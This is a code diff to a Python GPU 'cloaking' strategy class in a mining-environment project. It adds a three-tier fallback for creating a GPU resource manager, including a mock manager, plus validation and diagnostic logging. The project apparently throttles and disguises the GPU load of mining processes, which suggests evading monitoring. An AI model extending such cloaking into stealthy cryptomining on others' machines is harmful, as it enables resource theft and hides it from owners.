@@ -352,7 +352,7 @@ class GpuCloakStrategy(CloakStrategy):
         gpu_resource_manager: GPUResourceManager
     ):
         """
-        ✅ UNIFIED: Khởi tạo comprehensive GPU cloaking với integrated thermal management.
+        ✅ ENHANCED: Robust constructor với comprehensive validation và multi-level fallback.
 
         :param config: Cấu hình cloaking GPU (dict).
         :param logger: Logger.
@@ -361,22 +361,16 @@ class GpuCloakStrategy(CloakStrategy):
         self.logger = logger
         self.config = config
 
-        # ✅ FALLBACK: If GPUResourceManager not provided, create on-demand
-        if gpu_resource_manager is None:
-            self.logger.warning("⚠️ GPUResourceManager is None – creating fallback instance (on-demand)")
-            try:
-                # Tránh import vòng lặp
-                from mining_environment.scripts.resource_control import GPUResourceManager as _GPUResourceManager
-                from mining_environment.scripts.unified_logging import get_unified_logger
-
-                fallback_logger = get_unified_logger('resource_control')
-                gpu_resource_manager = _GPUResourceManager(config, fallback_logger)
-                self.logger.info("✅ Fallback GPUResourceManager created successfully")
-            except Exception as err:
-                self.logger.error(f"❌ Failed to create fallback GPUResourceManager: {err}")
-                gpu_resource_manager = None
-
-        self.gpu_resource_manager = cast(Any, gpu_resource_manager)
+        # ✅ MULTI-LEVEL FALLBACK MECHANISM: 3 layers of GPU manager creation
+        self.gpu_resource_manager = self._initialize_gpu_manager_with_fallback(
+            gpu_resource_manager, config, logger
+        )
+        
+        # ✅ CRITICAL VALIDATION: Ensure we have a working GPU manager
+        if not self._validate_gpu_manager_functionality():
+            error_msg = "GPU cloaking strategy cannot operate without functional GPU manager"
+            self.logger.error(f"💀 [CONSTRUCTOR] {error_msg}")
+            raise RuntimeError(error_msg)
 
         self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring
 
@@ -421,6 +415,327 @@ class GpuCloakStrategy(CloakStrategy):
         if self.temperature_threshold <= 0:
             self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
             self.temperature_threshold = 80
+
+    def _initialize_gpu_manager_with_fallback(
+        self, 
+        gpu_resource_manager: Any, 
+        config: Dict[str, Any], 
+        logger: logging.Logger
+    ) -> Any:
+        """
+        ✅ MULTI-LEVEL FALLBACK: 3-tier GPU manager initialization strategy.
+        
+        Tier 1: Direct injection (from dependency injection)
+        Tier 2: Lazy creation (on-demand creation)
+        Tier 3: Minimal fallback (testing/emergency mode)
+        
+        :param gpu_resource_manager: Injected GPU manager (can be None)
+        :param config: Configuration dictionary
+        :param logger: Logger instance
+        :return: Working GPU manager or None
+        """
+        # ✅ TIER 1: Direct injection (preferred method)
+        if self._validate_gpu_manager_instance(gpu_resource_manager):
+            logger.info("✅ [TIER 1] Using injected GPU resource manager")
+            return gpu_resource_manager
+        
+        logger.warning("⚠️ [TIER 1] Injected GPU manager invalid/None - proceeding to Tier 2")
+        
+        # ✅ TIER 2: Lazy creation (on-demand fallback)
+        lazy_manager = self._attempt_lazy_gpu_manager_creation(config, logger)
+        if self._validate_gpu_manager_instance(lazy_manager):
+            logger.info("✅ [TIER 2] Lazy creation GPU manager successful")
+            return lazy_manager
+        
+        logger.warning("⚠️ [TIER 2] Lazy creation failed - proceeding to Tier 3")
+        
+        # ✅ TIER 3: Minimal fallback (last resort)
+        minimal_manager = self._create_minimal_gpu_manager(config, logger)
+        if minimal_manager:
+            logger.warning("⚠️ [TIER 3] Using minimal fallback GPU manager - limited functionality")
+            return minimal_manager
+        
+        logger.error("💀 [ALL TIERS FAILED] No GPU manager could be created")
+        return None
+
+    def _validate_gpu_manager_instance(self, gpu_manager: Any) -> bool:
+        """
+        ✅ VALIDATION: Comprehensive GPU manager instance validation.
+        
+        :param gpu_manager: GPU manager to validate
+        :return: True if manager is valid and functional
+        """
+        try:
+            if gpu_manager is None:
+                return False
+            
+            # Check required attributes
+            required_attrs = ['config', 'logger']
+            for attr in required_attrs:
+                if not hasattr(gpu_manager, attr):
+                    self.logger.debug(f"❌ [VALIDATION] GPU manager missing attribute: {attr}")
+                    return False
+            
+            # Check GPU-specific methods
+            gpu_methods = ['get_gpu_count', 'is_nvml_initialized']
+            for method in gpu_methods:
+                if not hasattr(gpu_manager, method):
+                    self.logger.debug(f"❌ [VALIDATION] GPU manager missing method: {method}")
+                    return False
+            
+            # Test basic functionality
+            try:
+                if hasattr(gpu_manager, 'is_nvml_initialized'):
+                    nvml_status = gpu_manager.is_nvml_initialized()
+                    self.logger.debug(f"🔍 [VALIDATION] NVML status: {nvml_status}")
+                    # NVML failure is not fatal - might be in testing mode
+                
+                if hasattr(gpu_manager, 'get_gpu_count'):
+                    gpu_count = gpu_manager.get_gpu_count()
+                    self.logger.debug(f"🔍 [VALIDATION] GPU count: {gpu_count}")
+                    
+            except Exception as e:
+                self.logger.debug(f"⚠️ [VALIDATION] GPU manager functionality test failed: {e}")
+                # Not fatal - manager might still work for basic operations
+            
+            return True
+            
+        except Exception as e:
+            self.logger.debug(f"❌ [VALIDATION] GPU manager validation error: {e}")
+            return False
+
+    def _attempt_lazy_gpu_manager_creation(self, config: Dict[str, Any], logger: logging.Logger) -> Any:
+        """
+        ✅ LAZY CREATION: Attempt on-demand GPU manager creation.
+        
+        :param config: Configuration dictionary
+        :param logger: Logger instance
+        :return: GPU manager instance or None
+        """
+        try:
+            logger.info("🔧 [LAZY CREATION] Attempting on-demand GPU manager creation")
+            
+            # Import with circular import protection
+            from mining_environment.scripts.resource_control import GPUResourceManager as _GPUResourceManager
+            from mining_environment.scripts.unified_logging import get_unified_logger
+
+            # Create dedicated logger for fallback manager
+            fallback_logger = get_unified_logger('gpu_fallback')
+            
+            # Create GPU manager with current config
+            gpu_manager = _GPUResourceManager(config, fallback_logger)
+            
+            if self._validate_gpu_manager_instance(gpu_manager):
+                logger.info("✅ [LAZY CREATION] GPU manager created successfully")
+                return gpu_manager
+            else:
+                logger.warning("⚠️ [LAZY CREATION] Created GPU manager failed validation")
+                
+        except ImportError as e:
+            logger.error(f"❌ [LAZY CREATION] Import error: {e}")
+        except Exception as e:
+            logger.error(f"❌ [LAZY CREATION] Creation error: {e}")
+        
+        return None
+
+    def _create_minimal_gpu_manager(self, config: Dict[str, Any], logger: logging.Logger) -> Any:
+        """
+        ✅ MINIMAL FALLBACK: Create minimal mock/testing GPU manager.
+        
+        For testing scenarios or when GPU hardware is not available.
+        
+        :param config: Configuration dictionary
+        :param logger: Logger instance
+        :return: Minimal GPU manager mock or None
+        """
+        try:
+            logger.warning("🔧 [MINIMAL FALLBACK] Creating minimal GPU manager for testing/fallback")
+            
+            # Create minimal mock manager for testing scenarios
+            class MinimalGPUManager:
+                def __init__(self, config, logger):
+                    self.config = config
+                    self.logger = logger
+                    self.minimal_mode = True
+                
+                def is_nvml_initialized(self):
+                    return False  # Mock NVML not available
+                
+                def get_gpu_count(self):
+                    return 0  # No GPUs in minimal mode
+                
+                def get_gpu_power_limit(self, gpu_index):
+                    self.logger.warning(f"🔧 [MINIMAL] Mock GPU power limit request for GPU {gpu_index}")
+                    return 100  # Mock power limit
+                
+                def set_gpu_power_limit(self, pid, gpu_index, power_limit):
+                    self.logger.warning(f"🔧 [MINIMAL] Mock GPU power limit set: PID={pid}, GPU={gpu_index}, limit={power_limit}W")
+                    return True  # Mock success
+                
+                def get_handle(self, gpu_index):
+                    self.logger.warning(f"🔧 [MINIMAL] Mock GPU handle request for GPU {gpu_index}")
+                    return None  # No real handle in minimal mode
+                
+                def limit_temperature(self, gpu_index, temperature_threshold, fan_speed_increase):
+                    self.logger.warning(f"🔧 [MINIMAL] Mock temperature limit: GPU={gpu_index}, threshold={temperature_threshold}°C")
+                    return True  # Mock success
+                
+                def get_gpu_temperature(self, gpu_index):
+                    self.logger.warning(f"🔧 [MINIMAL] Mock temperature request for GPU {gpu_index}")
+                    return 65.0  # Mock safe temperature
+            
+            minimal_manager = MinimalGPUManager(config, logger)
+            logger.warning("⚠️ [MINIMAL FALLBACK] Minimal GPU manager created - ALL GPU operations will be mocked")
+            logger.warning("⚠️ [MINIMAL FALLBACK] This should only be used for testing or systems without GPU hardware")
+            
+            return minimal_manager
+            
+        except Exception as e:
+            logger.error(f"❌ [MINIMAL FALLBACK] Failed to create minimal GPU manager: {e}")
+            return None
+
+    def _validate_gpu_manager_functionality(self) -> bool:
+        """
+        ✅ FUNCTIONALITY CHECK: Validate GPU manager can perform required operations.
+        
+        :return: True if GPU manager can perform basic required operations
+        """
+        try:
+            if self.gpu_resource_manager is None:
+                self.logger.error("❌ [FUNCTIONALITY] GPU manager is None")
+                return False
+            
+            # Check if we have minimal functionality
+            required_methods = ['get_gpu_count', 'set_gpu_power_limit', 'get_gpu_power_limit']
+            missing_methods = []
+            
+            for method in required_methods:
+                if not hasattr(self.gpu_resource_manager, method):
+                    missing_methods.append(method)
+            
+            if missing_methods:
+                self.logger.error(f"❌ [FUNCTIONALITY] GPU manager missing methods: {missing_methods}")
+                return False
+            
+            # Test basic operations (non-destructive)
+            try:
+                gpu_count = self.gpu_resource_manager.get_gpu_count()
+                self.logger.debug(f"✅ [FUNCTIONALITY] GPU count test: {gpu_count}")
+                
+                # Additional validation can be added here
+                
+            except Exception as e:
+                self.logger.warning(f"⚠️ [FUNCTIONALITY] GPU manager method test failed: {e}")
+                # Not necessarily fatal - might be in testing mode
+            
+            self.logger.info("✅ [FUNCTIONALITY] GPU manager functionality validated")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ [FUNCTIONALITY] GPU manager functionality check failed: {e}")
+            return False
+
+    def _validate_gpu_manager_runtime(self) -> bool:
+        """
+        ✅ RUNTIME VALIDATION: Real-time GPU manager readiness check before operations.
+        
+        :return: True if GPU manager is ready for immediate use
+        """
+        try:
+            if self.gpu_resource_manager is None:
+                self.logger.error("❌ [RUNTIME] GPU manager is None")
+                return False
+            
+            # Check if manager still has required attributes
+            if not hasattr(self.gpu_resource_manager, 'config'):
+                self.logger.error("❌ [RUNTIME] GPU manager missing config attribute")
+                return False
+            
+            # Test critical methods availability
+            critical_methods = ['get_gpu_count', 'set_gpu_power_limit']
+            for method in critical_methods:
+                if not hasattr(self.gpu_resource_manager, method) or not callable(getattr(self.gpu_resource_manager, method)):
+                    self.logger.error(f"❌ [RUNTIME] GPU manager missing/invalid method: {method}")
+                    return False
+            
+            # Quick functionality test
+            try:
+                # Non-destructive test
+                gpu_count = self.gpu_resource_manager.get_gpu_count()
+                self.logger.debug(f"✅ [RUNTIME] GPU manager runtime test passed (GPUs: {gpu_count})")
+                return True
+                
+            except Exception as e:
+                self.logger.warning(f"⚠️ [RUNTIME] GPU manager functionality test failed: {e}")
+                # In minimal/mock mode, this might fail but we can still proceed
+                return hasattr(self.gpu_resource_manager, 'minimal_mode')
+            
+        except Exception as e:
+            self.logger.error(f"❌ [RUNTIME] Runtime validation error: {e}")
+            return False
+
+    def _log_gpu_manager_diagnostics(self) -> None:
+        """
+        ✅ DIAGNOSTICS: Log comprehensive GPU manager diagnostic information.
+        
+        Provides actionable troubleshooting information when GPU manager fails.
+        """
+        try:
+            self.logger.error("🔍 [DIAGNOSTICS] GPU Manager Diagnostic Information:")
+            self.logger.error("=" * 60)
+            
+            # Basic state information
+            self.logger.error(f"📊 [DIAGNOSTICS] GPU Manager State: {type(self.gpu_resource_manager)}")
+            self.logger.error(f"📊 [DIAGNOSTICS] GPU Manager is None: {self.gpu_resource_manager is None}")
+            
+            if self.gpu_resource_manager is not None:
+                # Check attributes
+                attrs = ['config', 'logger', 'gpu_initialized', 'minimal_mode']
+                for attr in attrs:
+                    has_attr = hasattr(self.gpu_resource_manager, attr)
+                    if has_attr:
+                        try:
+                            value = getattr(self.gpu_resource_manager, attr)
+                            self.logger.error(f"✅ [DIAGNOSTICS] {attr}: {value}")
+                        except Exception as e:
+                            self.logger.error(f"⚠️ [DIAGNOSTICS] {attr}: Error accessing ({e})")
+                    else:
+                        self.logger.error(f"❌ [DIAGNOSTICS] {attr}: Missing")
+                
+                # Check methods
+                methods = ['get_gpu_count', 'set_gpu_power_limit', 'is_nvml_initialized']
+                for method in methods:
+                    has_method = hasattr(self.gpu_resource_manager, method)
+                    is_callable = callable(getattr(self.gpu_resource_manager, method)) if has_method else False
+                    self.logger.error(f"🔧 [DIAGNOSTICS] {method}: Available={has_method}, Callable={is_callable}")
+                
+                # Test basic functionality
+                try:
+                    if hasattr(self.gpu_resource_manager, 'get_gpu_count'):
+                        gpu_count = self.gpu_resource_manager.get_gpu_count()
+                        self.logger.error(f"🎮 [DIAGNOSTICS] GPU Count Test: {gpu_count}")
+                except Exception as e:
+                    self.logger.error(f"❌ [DIAGNOSTICS] GPU Count Test Failed: {e}")
+                
+                try:
+                    if hasattr(self.gpu_resource_manager, 'is_nvml_initialized'):
+                        nvml_status = self.gpu_resource_manager.is_nvml_initialized()
+                        self.logger.error(f"🔌 [DIAGNOSTICS] NVML Status: {nvml_status}")
+                except Exception as e:
+                    self.logger.error(f"❌ [DIAGNOSTICS] NVML Status Test Failed: {e}")
+            
+            # Provide actionable suggestions
+            self.logger.error("💡 [DIAGNOSTICS] Troubleshooting Suggestions:")
+            self.logger.error("   1. Check NVIDIA drivers are installed and up to date")
+            self.logger.error("   2. Verify GPU hardware is properly connected")
+            self.logger.error("   3. Ensure proper permissions for GPU access")
+            self.logger.error("   4. Check if pynvml is installed: pip install pynvml")
+            self.logger.error("   5. Verify ResourceControlFactory configuration")
+            self.logger.error("   6. Check system logs for GPU/driver errors")
+            self.logger.error("=" * 60)
+            
+        except Exception as e:
+            self.logger.error(f"❌ [DIAGNOSTICS] Failed to generate diagnostics: {e}")
 
     def _limit_temperature_and_random_sleep(self, pid: int, gpu_count: int) -> None:
         """
@@ -468,9 +783,10 @@ class GpuCloakStrategy(CloakStrategy):
         :return: bool - True nếu GPU cloaking áp dụng thành công, False nếu thất bại
         """
         try:
-            # ✅ SAFETY CHECK: Ensure gpu_resource_manager ready
-            if self.gpu_resource_manager is None:
-                self.logger.error("💀 GPUResourceManager not available – aborting gpu_cloaking apply")
+            # ✅ ENHANCED SAFETY CHECK: Comprehensive GPU manager validation
+            if not self._validate_gpu_manager_runtime():
+                self.logger.error("💀 [SAFETY CHECK] GPU resource manager not ready – aborting gpu_cloaking apply")
+                self._log_gpu_manager_diagnostics()
                 return False
 
             pid, name = process.pid, process.name
@@ -482,12 +798,12 @@ class GpuCloakStrategy(CloakStrategy):
                 self.logger.debug(
                     f"[GPU Cloaking] Bỏ qua tiến trình '{name}' (PID={pid}) do không khớp tên GPU trong config."
                 )
-                return
+                return True  # ✅ SUCCESS: Skipped by design, not an error
 
             gpu_count = self.gpu_resource_manager.get_gpu_count()
             if gpu_count == 0:
                 self.logger.warning("[GPU Cloaking] Hệ thống không có GPU. Bỏ qua cloaking.")
-                return
+                return True  # ✅ SUCCESS: Skipped due to no GPUs (not an error)
 
             # Giới hạn power + set clocks cho mỗi GPU
             for gpu_index in range(gpu_count):
